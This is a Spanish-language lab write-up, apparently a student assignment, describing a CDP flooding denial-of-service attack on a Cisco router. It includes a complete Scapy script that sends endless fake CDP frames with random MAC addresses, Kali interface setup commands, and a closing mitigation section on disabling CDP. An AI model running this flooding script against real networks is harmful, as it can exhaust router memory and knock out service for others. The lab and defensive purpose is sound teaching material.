# Ataque DoS por cdp
Descripción: Este script automatiza la generación e inyección de tramas CDP (Cisco Discovery Protocol) falsas en la red. Utiliza la librería Scapy para construir paquetes de Capa 2 que son aceptados por routers Cisco debido a la falta de mecanismos de autenticación en el protocolo.
--- REQUISITOS PARA USAR EL SCRIPT ---
1.	topologia que tenga conexión de punto a punto
2.	direccionamiento
3.	version actualizada de python3 ( kali Linux )
4.	version actualizada de Scapy ( kali Linux )
5.	privilegios de root ( kali Linux )
Objetivo:
Demostrar la vulnerabilidad de confianza intrínseca en protocolos de descubrimiento.
Realizar un agotamiento de recursos (RAM) en el dispositivo objetivo (DoS).
Uso:
•	sudo python3 cdp_dos.py
Parámetros clave:
Destination MAC: 01:00:0c:cc:cc:cc (Multicast de Cisco).
configuración:
La IP y la MAC del router (gateway)
target_ip_gateway = "la ip de tu router" target_mac_gateway = "la mac de tu router"
La IP y la MAC de la víctima
target_ip_victim = "la ip de la victima" target_mac_victim = "la mac de la victima"
El número de paquetes a enviar en cada iteración
packet_count = 2
--- TOPOLOGIA ---
#use un router c7200 #use un switch para establecer contacto la maquina de kali #use una maquina kali para realizar el ataque.
---archivo de ataque ---
Utilizamos el comando nano cdp_dos.py para crear y abrir nuestro archivo y dentro del archivo tenemos :
from scapy.all import *
import time

def cdp_packet():
    # CDP usa SNAP encapsulado en Ethernet
    ether = Ether(dst="01:00:0c:cc:cc:cc", src=RandMAC(), type=0x2000)
    llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x003)
    snap = SNAP(OUI=0x00000c, code=0x2000)
    # Payload simulado
    payload = Raw(load=b"\x01\x02FakeCDPData")
    return ether / llc / snap / payload

while True:
    pkt = cdp_packet()
    sendp(pkt, iface="eth0", verbose=False)
    time.sleep(0.1)  # Ajusta la frecuencia

despues utilizamos control+o para guardar y después control +x para salir.

--- DIRECCIONAMIENTO ---
mi matricula: 2024-1462
IP DEL ROUTER = 10.24.62.1 IP DE KALI LINUX = 10.24.62.2 IP 
--- PARAMETROS USADOS ---
#CONFIGURACION DE KALI#
sudo ip addr add 10.24.62.2/24 dev eth0 sudo ip link set dev eth0 up sudo ip route add default via 10.24.62.1
USE ESTOS COMANDOS PARA AGREGAR LA IP A LA ETH0 Y ASI ESTABLECER CONTACTO CON EL ROUTER Y la maquina
#Mitigación para el ataque de CDP#
El problema de CDP es que confía en cualquier trama que recibe. La solución es limitar dónde se escucha este protocolo.
Medidas Técnicas: Desactivación Global: Si no utilizas herramientas de gestión de red de Cisco, apaga el protocolo por completo.
•	R1(config)# no cdp run
Desactivación por Interfaz: La regla de oro es: Desactivar CDP en todos los puertos que conectan a usuarios finales (puertos de acceso). Solo déjalo activo en puertos que conectan a otros routers o switches de confianza.
•	R1(config-if)# no cdp enable
Uso de LLDP con Seguridad: Cambiar a LLDP (Link Layer Discovery Protocol), que es el estándar abierto, y configurar filtros específicos si el hardware lo permite.
